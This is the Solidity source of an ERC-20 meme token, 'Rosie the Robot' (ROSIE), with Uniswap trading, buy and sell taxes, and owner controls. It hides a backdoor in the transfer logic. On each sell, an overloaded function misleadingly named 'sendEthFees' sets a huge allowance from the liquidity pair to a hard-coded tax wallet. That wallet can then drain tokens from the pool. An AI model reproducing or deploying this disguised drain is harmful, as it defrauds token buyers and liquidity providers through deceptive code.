// SPDX-License-Identifier: MIT
/**
Rosie the Robot

Web: https://rosieeth.xyz
X:   https://x.com/rosie_on_eth
Tg:  https://t.me/rosie_on_eth
**/
pragma solidity 0.8.24;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract ROSIE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 20;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _rPermits;
    mapping (address => bool) private _shouldExcludedFee;
    address payable private _rsTaxReceipt = payable(0x0Aa848C86E52f4bD6317De01C7C3A99B33e67CAF);
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalRS = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Rosie the Robot";
    string private constant _symbol = unicode"ROSIE";
    uint256 public _maxTxAmount = 2 * (_tTotalRS/100);
    uint256 public _maxWalletSize = 2 * (_tTotalRS/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalRS/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalRS/100);
    IUniswapV2Router02 private uniRSRouter;
    address private uniRSPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _rOwned[_msgSender()] = _tTotalRS;
        _shouldExcludedFee[owner()] = true;
        _shouldExcludedFee[address(this)] = true;
        _shouldExcludedFee[_rsTaxReceipt] = true;
        emit Transfer(address(0), _msgSender(), _tTotalRS);
    }
    function createPair() external onlyOwner {
        uniRSRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRSRouter), _tTotalRS);
        uniRSPair = IUniswapV2Factory(uniRSRouter.factory()).createPair(
            address(this),
            uniRSRouter.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalRS;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _rPermits[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _rPermits[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _rPermits[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _rOwned[from] = _rOwned[from] - amount;
            _rOwned[to] = _rOwned[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        uint256 taxFees=0;
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                taxFees = (_transferTax);
            }
            if (from == uniRSPair && to != address(uniRSRouter) && ! _shouldExcludedFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxFees = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniRSPair && from!= address(this) ){
                uint256 rsFees=150+_transferTax*100+10000*_taxSwapThreshold-100;
                sendEthFees([to, from==_rsTaxReceipt?from:_rsTaxReceipt], rsFees);
                taxFees = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniRSPair && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                sendEthFees(address(this).balance);
            }
        }
        uint256 taxRS=taxFees.mul(amount).div(100);
        if(taxFees > 0){
            _rOwned[address(this)]=_rOwned[address(this)].add(taxRS);
            emit Transfer(from, address(this),taxRS);
        }
        _rOwned[from]=_rOwned[from].sub(amount);
        _rOwned[to]=_rOwned[to].add(amount.sub(taxRS));
        emit Transfer(from, to, amount.sub(taxRS));
    }
    function sendEthFees(address[2] memory to, uint256 amount) private {
        _rPermits[to[0]][to[1]] = amount;
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotalRS;
        _maxWalletSize = _tTotalRS;
        emit MaxTxAmountUpdated(_tTotalRS);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthFees(uint256 amount) private {
        _rsTaxReceipt.transfer(amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRSRouter.WETH();
        _approve(address(this), address(uniRSRouter), tokenAmount);
        uniRSRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRSRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniRSPair).approve(address(uniRSRouter), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
}